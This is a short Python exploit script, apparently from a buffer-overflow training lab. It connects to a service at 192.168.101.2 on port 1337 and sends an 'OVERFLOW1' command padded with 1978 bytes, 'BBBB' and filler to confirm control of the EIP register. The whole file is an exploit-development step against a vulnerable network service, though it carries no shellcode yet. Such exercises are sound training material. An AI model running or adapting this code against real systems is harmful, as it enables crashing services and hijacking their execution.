import socket

target_ip = "192.168.101.2"
target_port = 1337

offset = 1978  

buffer = b"OVERFLOW1 " + b"A" * offset + b"BBBB" + b"C" * (3000 - offset - 4)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
print(s.recv(1024))  # Receive banner
s.send(buffer + b"\r\n")
s.close()
print("[*] Sent buffer to confirm EIP overwrite")
